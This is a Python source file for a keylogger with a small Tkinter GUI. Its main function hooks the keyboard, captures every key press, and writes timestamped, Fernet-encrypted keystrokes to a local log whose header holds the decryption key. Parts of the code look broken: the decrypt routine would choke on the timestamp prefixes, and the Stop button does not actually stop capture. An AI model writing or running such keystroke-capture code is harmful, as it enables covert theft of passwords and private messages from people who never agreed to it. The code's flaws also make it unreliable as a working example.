import os
import keyboard
import base64
import subprocess
from cryptography.fernet import Fernet
from datetime import datetime
import tkinter as tk
from tkinter import messagebox

def generate_key():
    return Fernet.generate_key()

def encrypt_data(data, key):
    f = Fernet(key)
    return f.encrypt(data.encode())

def delete_log_file(file_path, export_old_log=True):
    if os.path.exists(file_path):
        if export_old_log:
            # Export the old log file with timestamp in the name
            current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            old_log_backup = f"old_log_{current_time}.txt"
            # Read the secret key value from the original log
            with open(file_path, 'r') as log_file:
                lines = log_file.readlines()
                secret_key = lines[1].strip()
            # Write the old log with the secret key in the header
            with open(old_log_backup, 'w') as old_log_file:
                # old_log_file.write("Encrypted Keylogger Log\n")
                old_log_file.write("Encrypted Keylogger Log\n")
                old_log_file.write(f"{secret_key}\n")
                old_log_file.writelines(lines[2:])
            print(f"Old log file exported as '{old_log_backup}'.")
        else:
            os.remove(file_path)

def create_new_log_file(file_path, secret_key):
    with open(file_path, 'w') as log_file:
        log_file.write("Encrypted Keylogger Log\n")
        log_file.write(f"{secret_key.decode()}\n")

def decrypt_log(file_path, secret_key):
    with open(file_path, 'r') as log_file:
        encrypted_data = log_file.readlines()[2:]  # Skip first two lines

    f = Fernet(secret_key)
    decrypted_data = [f.decrypt(data.strip().encode()).decode() for data in encrypted_data]

    return decrypted_data

def start_keylogger():
    # Generate a 32-byte URL-safe base64-encoded key
    secret_key = base64.urlsafe_b64encode(os.urandom(32))
    file_path = 'encrypted_log.txt'

    # Delete the existing log file (if it exists) and export it before deletion
    delete_log_file(file_path)

    # Create a new log file with the secret key value
    create_new_log_file(file_path, secret_key)

    try:
        with open(file_path, 'a') as log_file:
            while True:
                event = keyboard.read_event()
                # Check if it's a key press event
                if event.event_type == keyboard.KEY_DOWN:
                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    keystroke = event.name
                    encrypted_keystroke = encrypt_data(keystroke, secret_key)
                    log_file.write(f"{timestamp}: {encrypted_keystroke.decode()}\n")
    except KeyboardInterrupt:
        print("Keylogger stopped.")
        # Add the secret key in the header of the log file
        delete_log_file(file_path)
        with open(file_path, 'r+') as log_file:
            lines = log_file.readlines()
            log_file.seek(0)
            log_file.write("Encrypted Keylogger Log\n")
            log_file.write(f"{secret_key.decode()}\n")
            log_file.writelines(lines[2:])

def stop_keylogger():
    messagebox.showinfo("Keylogger Stopped", "Keylogger has been stopped.")

def main():
    root = tk.Tk()
    root.title("Keylogger GUI")

    start_button = tk.Button(root, text="Start Keylogger", command=start_keylogger)
    start_button.pack(pady=10)

    stop_button = tk.Button(root, text="Stop Keylogger", command=stop_keylogger)
    stop_button.pack(pady=5)

    root.mainloop()

if __name__ == "__main__":
    main()